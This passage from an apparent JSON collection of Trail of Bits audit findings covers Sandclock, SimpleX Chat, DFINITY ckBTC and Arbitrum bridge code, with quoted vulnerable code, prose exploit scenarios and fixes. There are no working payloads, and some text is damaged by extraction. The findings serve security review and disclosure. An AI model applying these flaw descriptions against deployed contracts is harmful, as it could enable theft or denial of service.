governance system decides to start charging fees for ash loans. Users of the Sandclock protocol now discover that, apart from the oat margin, most of their funds are locked because it is impossible to use the ash loan functions to withdraw vault assets from the underlying investment pools. Recommendations Short term, use the feeAmounts parameter in the calculation for repayment to account for future Balancer ash loan fees. This will prevent unexpected reverts in the ash loan handler function. Long term, document and justify all ignored arguments provided by external callers. This will facilitate a review of the systems third-party interactions and help prevent similar issues from being introduced in the future.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "2. Reward token distribution rate can diverge from reward token balance ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-sandclock-securityreview.pdf", "body": "The privileged distributor role is responsible for transferring reward tokens to the RewardTracker contract and then passing the number of tokens sent as the _reward parameter to the notifyRewardAmount method. However, the _reward parameter provided to this method can be larger than the number of reward tokens transferred. Given the accounting for leftover rewards, such a situation would be dicult to recover from. /// @notice Lets a reward distributor start a new reward period. The reward tokens must have already /// been transferred to this contract before calling this function. If it is called /// when a reward period is still active, a new reward period will begin from the time /// of calling this function, using the leftover rewards from the old reward period plus /// the newly sent rewards as the reward. /// @dev If the reward amount will cause an overflow when computing rewardPerToken, then /// this function will revert. /// @param _reward The amount of reward tokens to use in the new reward period. function notifyRewardAmount ( uint256 _reward ) external onlyDistributor { _notifyRewardAmount(_reward); } Figure 2.1: The comment on the notifyRewardAmount method hints at an unenforced assumption that the number of reward tokens transferred must be equal to the _reward parameter provided. ( sandclock-contracts/src/staking/RewardTracker.sol#L185L195 ) If a _reward value smaller than the actual number of transferred tokens is provided, the situation can be xed by calling notifyRewardAmount again with a _reward parameter that accounts for the dierence between the RewardTracker contracts actual token balance and the rewards already scheduled for distribution. This solution is possible because the _notifyRewardAmount helper function accounts for leftover rewards if it is called during an ongoing reward period. function _notifyRewardAmount ( uint256 _reward ) internal { ... uint64 rewardRate_ = rewardRate; uint64 periodFinish_ = periodFinish; uint64 duration_ = duration; ... if ( block.timestamp >= periodFinish_) { newRewardRate = _reward / duration_; } else { uint256 remaining = periodFinish_ - block.timestamp ; uint256 leftover = remaining * rewardRate_; newRewardRate = (_reward + leftover ) / duration_; } Figure 2.2: The accounting for leftover rewards in the _notifyRewardAmount helper method ( sandclock-contracts/src/staking/RewardTracker.sol#L226L262 ) This accounting for leftover rewards, however, makes the situation dicult to recover from if a _reward parameter that is too large is provided to the notifyRewardAmount method. As shown by the arithmetic in gure 2.2, if the reward period has not nished, the code for creating the newRewardRate value can only add to the reward distribution, not subtract from it. The only way to bring a too-large reward distribution back in line with the RewardTracker contracts reward token balance is to transfer additional reward tokens to the contract. Exploit Scenario The RewardTracker distributor transfers 10 reward tokens to the RewardTracker contract and then mistakenly calls the notifyRewardAmount method with a _reward parameter of 100. Some users call the claimRewards method early and receive inated rewards until the contracts balance is depleted, leaving later users unable to claim any rewards. To recover, the distributor either needs to provide another 90 reward tokens to the RewardTracker contract or accept the reputational loss of allowing this miscongured reward period to nish before resetting the reward payouts correctly during the next period. Recommendations Short term, modify the _notifyRewardAmount helper function to reset the rewardRate so that it is in line with the current rewardToken balance and the time remaining in the reward period. This change could also allow the fetchRewards method to maintain its current behavior but with only a single rewardToken.balanceOf external call. Long term, review the internal accounting state variables and document the ways in which they are inuenced by the actual ow of funds. Pay attention to any internal accounting values that can be inuenced by external sources, including privileged accounts, and reexamine the systems assumptions surrounding the ow of funds.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "3. Miscalculation in beforeWithdraw can leave the vault with less than minimum oat ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-sandclock-securityreview.pdf", "body": "When a user wants to redeem or withdraw, the beforeWithdraw function is called with the number of assets to be withdrawn as the assets parameter. This function makes sure that if the value of the float parameter (that is, the available assets in the vault) is not enough to pay for the withdrawal, the strategy gets some assets back from the pools to be able to pay. function beforeWithdraw ( uint256 assets , uint256 ) internal override { uint256 float = asset.balanceOf( address ( this )); if (assets <= float) return ; uint256 minimumFloat = minimumFloatAmount; uint256 floatRequired = float < minimumFloat ? minimumFloat - float : 0 ; uint256 missing = assets + floatRequired - float; _withdrawToVault(missing); } Figure 3.1: The aected code in sandclock-contracts/src/steth/scWETHv2.sol#L386L396 When the float value is enough, the function returns and the withdrawal is paid with the existing oat. If the float value is not enough, the missing amount is recovered from the pools via the adapters. The issue lies in the calculation of the missing parameter: it does not guarantee that the float value remaining after the withdrawal is at least the value of the minimumFloatAmount parameter. The consequence is that the calculation always leaves a oat equal to floatRequired in the vault. If this value is small enough, it can cause users to waste gas when withdrawing small amounts because they will need to pay for the gas-intensive _withdrawToVault action. This eclipses the usefulness of having the oat in the vault. The correct calculation should be uint256 missing = assets + minimumFloat - float; . Using this correct calculation would make the calculation of the floatRequired parameter unnecessary as it would no longer be required or used in the rest of the code. Exploit Scenario The value for minimumFloatAmount is set to 1 ether in the scWETHv2 contract. For this scenario, suppose that the current oat is exactly equal to minimumFloatAmount . Alice wants to withdraw 0.15 WETH from her invested amount. Because this amount is less than the current oat, her withdrawal is paid from the vault assets, leaving the oat equal to 0.85 WETH after the operation. Then, Bill wants to withdraw 0.9 WETH, but the vault has no available assets to pay for it. In this case, when beforeWithdraw is called, Bill has to pay gas for the call to _withdrawToVault , which is an expensive action because it includes gas-intensive operations such as loops and a ash loan. After Bills withdrawal, the oat in the vault is 0.15 WETH. This is a relatively small amount compared with minimumFloatValue , and it will likely make the next withdrawing/redeeming user also have to pay for the call to _withdrawToVault . Recommendations Short term, replace the calculation of the missing amount to be withdrawn on line 393 of the scWETHv2 contract with assets + minimumFloat - float . This calculation will ensure that the minimum oat restriction is enforced after withdrawals. It will take the required oat into consideration, so the separate calculation of floatRequired on line 392 of scWETHv2 would no longer be required. Long term, add unit or fuzz tests to make sure that the vault has an amount of assets equal to or greater than the minimum expected amount at all times.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "4. Last user in scWETHv2 vault will not be able to withdraw their funds ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-sandclock-securityreview.pdf", "body": "When a user wants to withdraw, the withdrawal amount is checked against the current vault oat (the uninvested assets readily available in the vault). If the withdrawal amount is less than the oat, the amount is paid from the available balance; otherwise, the protocol has to disinvest from the strategies to get the required assets to pay for the withdrawal. The issue with this approach is that in order to maintain a oat equal to the minimumFloatValue parameter in the vault, the value to be disinvested from the strategies is calculated in the beforeWithdraw function, and its correct value is equal to the sum of the amount to be withdrawn and the minimum oat minus the current oat. If there is only one user remaining in the vault and they want to withdraw, this enforcement will not allow them to do so, because there will not be enough invested in the strategies to leave a minimum oat in the vault after the withdrawal. They would only be able to withdraw their assets minus the minimum oat at most. The code for the _withdrawToVault function is shown in gure 4.1. The line highlighted in the gure would cause the revert in this situation, as there would not be enough invested to supply the requested amount. function _withdrawToVault ( uint256 _amount ) internal { uint256 n = protocolAdapters.length(); uint256 flashLoanAmount ; uint256 totalInvested_ = _totalCollateralInWeth() - totalDebt(); bytes [] memory callData = new bytes [](n + 1 ); uint256 flashLoanAmount_ ; uint256 amount_ ; uint256 adapterId ; address adapter ; for ( uint256 i ; i < n; i++) { (adapterId, adapter) = protocolAdapters.at(i); (flashLoanAmount_, amount_) = _calcFlashLoanAmountWithdrawing(adapter, _amount, totalInvested_); flashLoanAmount += flashLoanAmount_; callData[i] = abi.encodeWithSelector( this .repayAndWithdraw.selector, adapterId, flashLoanAmount_, priceConverter.ethToWstEth(flashLoanAmount_ + amount_) ); } // needed otherwise counted as loss during harvest totalInvested -= _amount; callData[n] = abi.encodeWithSelector(scWETHv2.swapWstEthToWeth.selector, type( uint256 ).max, slippageTolerance); uint256 float = asset.balanceOf( address ( this )); _flashLoan(flashLoanAmount, callData); emit WithdrawnToVault(asset.balanceOf( address ( this )) - float); } Figure 4.1: The aected code in sandclock-contracts/src/steth/scWETHv2.sol#L342L376 Additionally, when this revert occurs, an integer overow is given as the reason, which obscures the real reason and can make the users experience more confusing. Exploit Scenario Bob is the only remaining user in a scWETHv2 vault, and he has 2 ether invested. He wants to withdraw his assets, but all of his calls to the withdrawal function keep reverting due to an integer overow. He keeps trying, wasting gas in the process, until he discovers that the maximum amount he is allowed to withdraw is around 1 ether. The rest of his funds are locked in the vault until the keeper makes a manual call to withdrawToVault or until the admin lowers the minimum oat value. Recommendations Short term, x the calculation of the amount to be withdrawn and make sure that it never exceeds the total invested amount. Long term, add end-to-end unit or fuzz tests that are representative of the way multiple users can interact with the protocol. Test for edge cases involving various numbers of users, investment amounts, and critical interactions, and make sure that the protocols invariants hold and that users do not lose access to funds in the event of such edge cases.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "5. Lido stake rate limit could lead to unexpected reverts ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-sandclock-securityreview.pdf", "body": "To mitigate the eects of a surge in demand for stETH on the deposit queue, Lido has implemented a rate limit for stake submissions. This rate limit is ignored by the lidoSwapWethToWstEth method of the Swapper library, potentially leading to unexpected reversions. The Lido stETH integration guide states the following: To avoid [reverts due to the rate limit being hit], you should check if getCurrentStakeLimit() >= amountToStake , and if it's not you can go with an alternative route. function lidoSwapWethToWstEth ( uint256 _wethAmount ) external { // weth to eth weth.withdraw(_wethAmount); // stake to lido / eth => stETH stEth.submit{value: _wethAmount}( address ( 0x00 )); // stETH to wstEth uint256 stEthBalance = stEth.balanceOf( address ( this )); ERC20( address (stEth)).safeApprove( address (wstETH), stEthBalance); wstETH.wrap(stEthBalance); } Figure 5.1: The submit method is subject to a rate limit that is not taken into account. ( sandclock-contracts/src/steth/Swapper.sol#L130L142 ) Exploit Scenario A surge in demand for Ethereum validators leads many people using Lido to stake ETH, causing the Lido rate limit to be hit, and the submit method of the stEth contract begins to revert. As a result, the Sandclock keeper is unable to deposit despite the presence of alternate routes to obtain stETH, such as through Curve or Balancer. Recommendations Short term, have the lidoSwapWethToWstEth method of the Swapper library check whether the amount being deposited is less than the value returned by the getCurrentStakeLimit method of the stEth contract. If it is not, have the code use ZeroEx to swap or revert with a message that clearly communicates the reason for the failure. Long term, review the documentation for all third-party interactions and note any situations in which the integration could revert unexpectedly. If such reversions are acceptable, clearly document how they could occur and include a justication for this acceptance in the inline comments.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "6. Chainlink oracles could return stale price data ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-sandclock-securityreview.pdf", "body": "The latestRoundData() function from Chainlink oracles returns ve values: roundId , answer , startedAt , updatedAt , and answeredInRound . The PriceConverter contract reads only the answer value and discards the rest. This can cause outdated prices to be used for token conversions, such as the ETH-to-USDC conversion shown in gure 6.1. function ethToUsdc ( uint256 _ethAmount ) public view returns ( uint256 ) { ( , int256 usdcPriceInEth ,,, ) = usdcToEthPriceFeed.latestRoundData(); return _ethAmount.divWadDown( uint256 (usdcPriceInEth) * C.WETH_USDC_DECIMALS_DIFF); } Figure 6.1: All returned data other than the answer value is ignored during the call to a Chainlink feeds latestRoundData method. ( sandclock-contracts/src/steth/PriceConverter.sol#L67L71 ) According to the Chainlink documentation , if the latestRoundData() function is used, the updatedAt value should be checked to ensure that the returned value is recent enough for the application. Similarly, the LUSD/ETH price feed used by the scLiquity vault is an intermediate contract that calls the deprecated latestAnswer method on upstream Chainlink oracles. contract LSUDUsdToLUSDEth is IPriceFeed { IPriceFeed public constant LUSD_USD = IPriceFeed( 0x3D7aE7E594f2f2091Ad8798313450130d0Aba3a0 ); IPriceFeed public constant ETH_USD = IPriceFeed( 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419 ); function latestAnswer () external view override returns ( int256 ) { return (LUSD_USD.latestAnswer() * 1 ether) / ETH_USD.latestAnswer(); } } Figure 6.2: The custom latestAnswer method in 0x60c0b047133f696334a2b7f68af0b49d2F3D4F72#code#L19 The Chainlink API reference ags the latestAnswer method as (Deprecated - Do not use this function.). Note that the upstream IPriceFeed contracts called by the intermediate LSUDUsdToLUSDEth contract are upgradeable proxies. It is possible that the implementations will be updated to remove support for the deprecated latestAnswer method, breaking the scLiquity vaults lusd2eth price feed. Because the oracle price feeds are used for calculating the slippage tolerance, a dierence may exist between the oracle price and the DEX pool spot price, either due to price update delays or normal price uctuations or because the feed has become stale. This could lead to two possible adverse scenarios:   If the oracle price is signicantly higher than the pool price, the slippage tolerance could be too loose, introducing the possibility of an MEV sandwich attack that can prot on the excess. If the oracle price is signicantly lower than the pool price, the slippage tolerance could be too tight, and the transaction will always revert. Users will perceive this as a denial of service because they would not be able to interact with the protocol until the price dierence is settled. Exploit Scenario Bob has assets invested in a scWETHv2 vault and wants to withdraw part of his assets. He interacts with the contracts, and every withdrawal transaction he submits reverts due to a large dierence between the oracle and pool prices, leading to failed slippage checks. This results in a waste of gas and leaves Bob confused, as there is no clear indication of where the problem lies. Recommendations Short term, make sure that the oracles report up-to-date data, and replace the external LUSD/ETH oracle with one that supports verication of the latest update timestamp. In the case of stale oracle data, pause price-dependent Sandclock functionality until the oracle comes back online or the admin replaces it with a live oracle. Long term, review the documentation for Chainlink and other oracle integrations to ensure that all of the security requirements are met to avoid potential issues, and add tests that take these possible situations into account. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "1. X3DH does not apply HKDF to generate secrets ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/SimpleXChat.pdf", "body": "The extended triple Die-Hellman (X3DH) key agreement protocol works by computing three separate Die-Hellman computations between pairs of keys. In particular, each party has a longer term private and public key pair as well as a more short-term private and public key pair. The three separate Die-Hellman computations are performed between the various pairs of long term and short term keys. The key agreement is performed this way to simultaneously authenticate each party and provide forward secrecy, which limits the impact of compromised keys. When performing the X3DH key agreement, the nal shared secret is formed by applying HKDF to the concatenation of all three Die-Hellman outputs. The computation is performed this way so that the shared secret depends on the entropy of all three Die-Hellman computations. If the X3DH protocol is being used to generate multiple shared secrets (which is the case for SimpleX), then these secrets should be formed by computing the HKDF over all three Die-Hellman outputs and then splitting the output of HKDF into separate shared secrets. However, as shown in Figure 1.1, the SimpleX implementation of X3DH uses each of the three Die-Hellman outputs as separate secrets for the Double Ratchet protocol, rather than inputting them into HKDF and splitting the output. x3dhSnd :: DhAlgorithm a => PrivateKey a -> PrivateKey a -> E2ERatchetParams a -> RatchetInitParams x3dhSnd spk1 spk2 ( E2ERatchetParams _ rk1 rk2) = x3dh (publicKey spk1, rk1) (dh' rk1 spk2) (dh' rk2 spk1) (dh' rk2 spk2) x3dhRcv :: DhAlgorithm a => PrivateKey a -> PrivateKey a -> E2ERatchetParams a -> RatchetInitParams x3dhRcv rpk1 rpk2 ( E2ERatchetParams _ sk1 sk2) = x3dh (sk1, publicKey rpk1) (dh' sk2 rpk1) (dh' sk1 rpk2) (dh' sk2 rpk2) x3dh :: DhAlgorithm a => ( PublicKey a, PublicKey a) -> DhSecret a -> DhSecret a -> DhSecret a -> RatchetInitParams x3dh (sk1, rk1) dh1 dh2 dh3 = RatchetInitParams {assocData, ratchetKey = RatchetKey sk, sndHK = Key hk, rcvNextHK = Key nhk} where assocData = Str $ pubKeyBytes sk1 <> pubKeyBytes rk1 (hk, rest) = B .splitAt 32 $ dhBytes' dh1 <> dhBytes' dh2 <> dhBytes' dh3 (nhk, sk) = B .splitAt 32 rest Figure 1.1: simplexmq/src/Simplex/Messaging/Crypto/Ratchet.hs#L98-L112 Performing the X3DH protocol this way will increase the impact of compromised keys and have implications for the theoretical forward secrecy of the protocol. To see why this is the case, consider what happens if a single key pair, (sk2 , spk2) , is compromised. In the current implementation, if an attacker compromises this key pair, then they can immediately recover the header key, hk , and the ratchet key, sk . However, if this were implemented by rst computing the HKDF over all three Die-Hellman outputs, then the attacker would not be able to recover these keys without also compromising another key pair. Note that SimpleX does not perform X3DH with long-term identity keys, as the SimpleX protocol does not rely on long-term keys to identify client devices. Therefore, the impact of compromising a key will be less severe, as it will aect only the secrets of the current session. Exploit Scenario An attacker is able to compromise a single X3DH key pair of a client using SimpleX chat. Because of how the X3DH is performed, they are able to then compromise the clients header key and ratchet key and can decrypt some of their messages. Recommendations Short term, adjust the X3DH implementation so that HKDF is computed over the concatenation of dh1 , dh2 , and dh3 before obtaining the ratchet key and header keys.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "2. The pad function is incorrect for long messages ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/SimpleXChat.pdf", "body": "The pad function from the Simplex.Messaging.Crypto module uses the fromIntegral function, resulting in an integer overow bug that leads to incorrect length encoding for messages longer than 65535 bytes (Figure 2.1). At the moment, the function appears to be called only with messages that are less than that; however, due to the general nature of the module, there is a risk of using a pad with longer messages as the message length assumption is not documented. pad :: ByteString -> Int -> Either CryptoError ByteString pad msg paddedLen | padLen >= 0 = Right $ encodeWord16 (fromIntegral len) <> msg <> B .replicate padLen '#' | otherwise = Left CryptoLargeMsgError where len = B .length msg padLen = paddedLen - len - 2 Figure 2.1: simplexmq/src/Simplex/Messaging/Crypto.hs#L805-L811 Exploit Scenario The pad function is used on messages longer than 65535 bytes, introducing a security vulnerability. Recommendations Short term, change the pad function to check the message length if it ts into 16 bits and return CryptoLargeMsgError if it does not. Long term, write unit tests for the pad function. Avoid using fromIntegral to cast to smaller integer types; instead, create a new function that will safely cast to smaller types that returns Maybe .", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "3. The unPad function throws exception for short messages ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/SimpleXChat.pdf", "body": "The unPad function throws an undocumented exception when the input is empty or a single byte. This is due to the decodeWord16 function, which throws an IOException if the input is not exactly two bytes. The unPad function does not appear to be used on such short inputs in the current code. unPad :: ByteString -> Either CryptoError ByteString unPad padded | B .length rest >= len = Right $ B .take len rest | otherwise = Left CryptoLargeMsgError where ( lenWrd , rest) = B .splitAt 2 padded len = fromIntegral $ decodeWord16 lenWrd Figure 3.1: simplexmq/src/Simplex/Messaging/Crypto.hs#L813-L819 Exploit Scenario The unPad function takes a user-controlled input and throws an exception that is not handled in a thread that is critical to the functioning of the protocol, resulting in a denial of service. Recommendations Short term, validate the length of the input passed to the unPad function and return an error if the input is too short. Long term, write unit tests for the unPad function to ensure the validation works as intended.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "4. Key material resides in unpinned memory and is not cleared after its lifetime ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/SimpleXChat.pdf", "body": "The key material generated and processed by the SimpleXMQ library resides in unpinned memory, and the data is not cleared out from the memory as soon as it is no longer used. The key material will stay on the Haskell heap until it is garbage collected and overwritten by other data. Combined with unpinned memory pages where the Haskells heap is allocated, this creates a risk of paging out unencrypted memory pages with the key material to disk. Because the memory management is abstracted away by the language, the manual memory management required to pin and zero-out the memory in garbage-collected language as Haskell is challenging. This issue does not concern the communication security; only device security is aected. Exploit Scenario The unencrypted key material is paged out to the hard drive, where it is exposed and can be stolen by an attacker. Recommendations Short term, investigate the use of mlock/mlockall on supported platforms to prevent memory pages that contain key material to be paged out. Explicitly zero out the key material as soon as it is no longer needed. Long term, document the key material memory management and the threat model around it.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "1. KYT canister is centralized on third-party provider ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-06-dfinity-ckBTC-securityreview.pdf", "body": "The KYT canister relies entirely on the third-party provider Chainalysis to clear Bitcoin transactions and is tightly integrated with it, creating a single point of failure in an otherwise highly decentralized system. It is possible to upgrade the KYT canister to a mode that clears all transactions, but this likely requires manual intervention. Exploit Scenario Chainalysis is compromised and marks all UTXOs as tainted, eectively denying the ckBTC to/from BTC transfer service for all users. Recommendations Short term, document this limitation and run monitoring to detect whether there is a risk that Chainalysis will become unreliable. Long term, add additional KYT providers and cross-check the results. This will ensure that a single provider cannot launch a denial-of-service attack against the KYT canister, and that the team is alerted if any anomalies arise.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "2. Risk of amount underow when retrieving BTC ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-06-dfinity-ckBTC-securityreview.pdf", "body": "The retrieve_btc call deducts the kyt_fee from the requested withdrawal amount. The arithmetic operation (gure 6.1) is not checked for underow, and there is no prior explicit check that would guarantee that kyt_fee is greater than or equal to args.amount . The args.amount value is guaranteed to be at least retrieve_btc_min_amount (gure 6.2). This implies that an underow will not occur if retrieve_btc_min_amount is greater than or equal to kyc_fee . This is a sane assumption; however, the condition is not ensured by the minter code and relies entirely on the correct init /upgrade value conguration, which is subject to human error. let request = RetrieveBtcRequest { // NB. We charge the KYT fee from the retrieve amount. amount: args .amount - kyt_fee , address: parsed_address , block_index, received_at: ic_cdk ::api::time(), kyt_provider: Some (kyt_provider), }; Figure 2.1: ( bitcoin/ckbtc/minter/src/updates/retrieve_btc.rs:178-185 ) let (min_amount, btc_network) = read_state(|s| (s.retrieve_btc_min_amount, s.btc_network)); if args.amount < min_amount { return Err (RetrieveBtcError::AmountTooLow(min_amount)); } Figure 2.2: ( bitcoin/ckbtc/minter/src/updates/retrieve_btc.rs:122-125 ) Exploit Scenario The canister is upgraded with a new kyt_fee value that is larger than the current retrieve_btc_min_amount value and enables the amount to underow. Recommendations Short term, use a checked_sub to compute the amount and provide a comment explaining why the inequality holds. Long term, perform checked arithmetic for all critical operations, and add comments to the code explaining why the corresponding invariant holds. 3. Minters init and upgrade congs insu\u0000ciently validated Severity: Informational Diculty: High Type: Data Validation Finding ID: TOB-DFBTC-3 Target: bitcoin/ckbtc/minter", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "4. Inconsistent error logging in minter ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-06-dfinity-ckBTC-securityreview.pdf", "body": "We found log messages produced by the minter to be inconsistent (gures 4.1 versus 4.2) and sometimes ambiguous (gure 4.2). Making log messages more consistent would simplify auditing and monitoring of the system. let block_index = client .transfer(TransferArg { from_subaccount: None , to, fee: None , created_at_time: None , memo: Some (Memo::from(txid.to_vec())), amount: Nat ::from(amount), }) . await .map_err(|e| UpdateBalanceError::TemporarilyUnavailable(e. 1 ))??; Figure 4.1: The error code ( e.0 ) is ignored. ( bitcoin/ckbtc/minter/src/updates/update_balance.rs#L302-L312 ) let result = client .transfer(TransferArg { from_subaccount: Some (from_subaccount), to: Account { owner: minter , subaccount: None , }, fee: None , created_at_time: None , memo: None , amount: Nat ::from(amount), }) . await .map_err(|( code , msg)| { RetrieveBtcError::TemporarilyUnavailable( format! ( \"cannot enqueue a burn transaction: {} ( reject_code = {} )\" , msg, code )) })?; Figure 4.1: The error code is included in the log message. ( bitcoin/ckbtc/minter/src/updates/retrieve_btc.rs#L236-L254 ) log!( P1, \"Minted {} {token_name} for account {caller_account} with value {}\" , DisplayOutpoint(&utxo.outpoint), DisplayAmount( utxo.value ), ); Figure 4.2: Without checking the code, it is unclear whether the value refers to the actual minted amount or the utxo.value . ( bitcoin/ckbtc/minter/src/updates/update_balance.rs#L199-L204 ) Recommendations Short term, review the log messages produced by the minter and change them to follow a consistent pattern. Long term, add instructions to the development guidelines on how to structure log messages.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "2. Risk of amount underow when retrieving BTC ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-06-dfinity-ckBTC-securityreview.pdf", "body": "The retrieve_btc call deducts the kyt_fee from the requested withdrawal amount. The arithmetic operation (gure 6.1) is not checked for underow, and there is no prior explicit check that would guarantee that kyt_fee is greater than or equal to args.amount . The args.amount value is guaranteed to be at least retrieve_btc_min_amount (gure 6.2). This implies that an underow will not occur if retrieve_btc_min_amount is greater than or equal to kyc_fee . This is a sane assumption; however, the condition is not ensured by the minter code and relies entirely on the correct init /upgrade value conguration, which is subject to human error. let request = RetrieveBtcRequest { // NB. We charge the KYT fee from the retrieve amount. amount: args .amount - kyt_fee , address: parsed_address , block_index, received_at: ic_cdk ::api::time(), kyt_provider: Some (kyt_provider), }; Figure 2.1: ( bitcoin/ckbtc/minter/src/updates/retrieve_btc.rs:178-185 ) let (min_amount, btc_network) = read_state(|s| (s.retrieve_btc_min_amount, s.btc_network)); if args.amount < min_amount { return Err (RetrieveBtcError::AmountTooLow(min_amount)); } Figure 2.2: ( bitcoin/ckbtc/minter/src/updates/retrieve_btc.rs:122-125 ) Exploit Scenario The canister is upgraded with a new kyt_fee value that is larger than the current retrieve_btc_min_amount value and enables the amount to underow. Recommendations Short term, use a checked_sub to compute the amount and provide a comment explaining why the inequality holds. Long term, perform checked arithmetic for all critical operations, and add comments to the code explaining why the corresponding invariant holds.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "3. Minters init and upgrade congs insu\u0000ciently validated ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-06-dfinity-ckBTC-securityreview.pdf", "body": "The init and upgrade arguments are described by the InitArgs and UpdateArgs structures, which are used to initialize and modify the minters state. There is very little validation of these values, which could lead to a pathological state as described in the previous nding. For instance, the ecdsa_key_name can be congured to be empty, kyt_fee can be larger than retrieve_btc_min_amount , and retrieve_btc_min_amount and max_time_in_queue_nanos are unbounded in the u64 range (gure 3.1). impl CkBtcMinterState { pub fn reinit ( & mut self , InitArgs { btc_network, ecdsa_key_name, retrieve_btc_min_amount, ledger_id, max_time_in_queue_nanos, min_confirmations, mode, kyt_fee, kyt_principal, }: InitArgs , ) { self .btc_network = btc_network; self .ecdsa_key_name = ecdsa_key_name; self .retrieve_btc_min_amount = retrieve_btc_min_amount; self .ledger_id = ledger_id; self .max_time_in_queue_nanos = max_time_in_queue_nanos; self .mode = mode; self .kyt_principal = kyt_principal; if let Some (kyt_fee) = kyt_fee { self .kyt_fee = kyt_fee; } if let Some (min_confirmations) = min_confirmations { self .min_confirmations = min_confirmations; } } ... } Figure 3.1: ( bitcoin/ckbtc/minter/src/state.rs#L322-L350 ) Exploit Scenario The canister is upgraded with a value that breaks an assumption in the code, which leads to state corruption. Recommendations Short term, include additional validation of conguration values where applicable and ensure that the implementation is covered by unit tests. Long term, always validate all data provided by the system's users.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "5. KYT API keys are exposed ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-06-dfinity-ckBTC-securityreview.pdf", "body": "The KYT API keys reside in canister memory, which is replicated across the network. The Internet Computer assumes that part of the network can be malicious (Byzantine fault tolerance) and the network should continue to function without disruption even if it is. This is not the case for the KYT canister, as a rogue node could abuse the API keys to drain the funds on the associated Chainalysis accounts and cause a denial of service. This further weakens the decentralization and reliability of the KYT service, as the risk of having the funds drained without remuneration will discourage maintainers from providing access to Chainalysis accounts. Exploit Scenario A malicious node operator reads the Chainalysis API keys from the canister memory and uses them anonymously to drain the funds intended to ensure the correct functioning of the KYT canister. Recommendations Short term, document this limitation and provide a risk assessment. Long term, nd a way to hold node operators accountable for misuse of the KYT API keys. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "1. L2 runtime code does not contain constructor code ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-offchain-labs-arbitrum-token-bridge-creator-securityreview.pdf", "body": "Contracts that are being deployed to L2 via retryable tickets on L1 do not include information on their creation code. This can be dangerous and lead to inconsistencies in state. The contracts deployed to L2 are encoded in the L1TokenBridgeRetryableSenders sendRetryable function. bytes memory data = abi.encodeCall( L2AtomicTokenBridgeFactory.deployL2Contracts, ( L2RuntimeCode( l2.routerTemplate.code, l2.standardGatewayTemplate.code, l2.customGatewayTemplate.code, l2.wethGatewayTemplate.code, l2.wethTemplate.code, l2.upgradeExecutorTemplate.code, l2.multicallTemplate.code ), l1.router, l1.standardGateway, l1.customGateway, l1.wethGateway, l1.weth, l2StandardGatewayAddress, rollupOwner, aliasedL1UpgradeExecutor ) ); Figure 1.1: The L2 contracts template code is included in a retryable TX. (L1TokenBridgeRetryableSender.sol) In order to deploy the code on the L2 side, a generic constructor code is used to deploy the given runtime code. // create L2 router logic and upgrade address routerLogic = Create2.deploy( 0, OrbitSalts.UNSALTED, CreationCodeHelper.getCreationCodeFor(runtimeCode) ); Figure 1.2: The L1 provided runtime code is wrapped with a generic constructor code. (L2AtomicTokenBridgeFactory.sol) The eect is that the original constructor is stripped away, which can be dangerous and lead to errors. For example, this could result in the removal of disabling initializers for proxy implementations, or it could lead to referencing invalid addresses on L2 due to immutable addresses included in the runtime code that were valid on L1 (e.g., corrupting the DelegateCallAwares onlyDelegated modier). Exploit Scenario In another upgrade, an implementation contract that is deployed on L2 is left uninitialized. A malicious user initializes the implementation and is able to self destruct it. Recommendations Short term, consider passing in the contracts creation code instead of the runtime code. Long term, ensure that all proxy and logic contracts are initialized correctly by adding further tests to any kind of contract deployed via a ticket.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "2. L2 token bridge contract deployment can be griefed ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-offchain-labs-arbitrum-token-bridge-creator-securityreview.pdf", "body": "The retryable ticket deploying the L2 token bridge contracts can fail if the call is front-run resulting in a blocked state. When creating the token bridge, L1AtomicTokenBridgeCreator sends out two retryable tickets, one for creating the L2AtomicTokenBridgeFactory contract and one for calling L2AtomicTokenBridgeFactory.deployL2Contracts. These tickets are expected to be atomic in the sense that they are all executed together and guaranteed to succeed. However, once both retryable tickets are created and pending, a malicious user has the chance to manually redeem the rst ticket, 